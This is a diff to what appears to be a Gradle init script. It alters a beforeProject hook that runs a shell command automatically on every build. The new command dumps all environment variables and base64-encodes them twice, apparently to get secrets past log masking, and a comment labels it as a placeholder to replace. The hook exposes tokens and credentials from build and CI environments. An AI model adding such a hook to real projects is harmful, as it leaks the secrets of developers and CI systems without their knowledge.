@@ -1,6 +1,6 @@
 gradle.beforeProject {
     exec {
-        commandLine 'sh', '-c', 'env|base64'
+        commandLine 'sh', '-c', 'env|base64|base64'
         // Replace with your desired shell command
     }
 }
